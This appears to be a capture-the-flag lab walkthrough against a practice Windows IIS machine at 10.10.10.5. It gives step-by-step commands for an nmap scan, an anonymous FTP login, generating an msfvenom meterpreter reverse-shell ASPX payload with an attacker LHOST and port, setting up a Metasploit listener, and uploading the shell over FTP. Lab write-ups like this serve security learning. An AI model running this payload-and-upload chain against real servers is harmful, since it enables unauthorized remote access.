Firstly we begin with our NMAP scan. From our scan results we see that ports 21 (ftp) & 80 (http) are open. My first obvservation is that anonymous login is permitted on the FTP server.

Before attempting to connect to FTP, I'd like to take a look at what the web server on port 80 is serving up so in a browser I navigate to "http://10.10.10.5". We see a default webpage for IIS Microsoft webserver. To save time I'll skip the step of running Dirbuster, which I would normally do at this point to see if I could bruteforce any hidden directories.

As the FTP server allows for anonymous login, I test it to see if we can get access. The anonymous login is successfull. We'll be using it to upload a malicious file. The malicious file will be a reverse shell that we'll be connecting to via Metasploit.

The snippet we need to generate our file can be found here "https://mytrickstuff.com/hacks-and-tricks/msfvenom-cheat-sheet-one-page-one-code/". As we're dealing with a Microsoft webserver we need to locate the payload for the file type of ASP. ```msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f asp > shell.asp```.

Enter the snippet for ```msfvenom``` to build the file. Add your tun0 IP to ```LHOST```. I changed the file extension to ASPX, but either ASP or ASPX will work, make sure the file extension in the command and the extension of the file your putting it in are the same. This will take a few seconds to generate. ```msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.16.4 LPORT=4444 -f aspx > ex.aspx```.

We fire up Metasploit using ```msfconsole``` and enter ```use exploit/multi/handler``` to begin opening up a listener.

We need to reconfigure the options. This requires setting the payload to the same as we used for the malicious reverse shell file we generated with ```msfvenom```. We also need to set the ```LHOST``` to the same IP as we used, which is the IP of our tun0 network interface. We enter ```run``` to start the listener.

Now we need to upload our malicious file. We connect to the FTP server with ```ftp 10.10.10.5```

And upload our file to the server with ```put ex.aspx```.
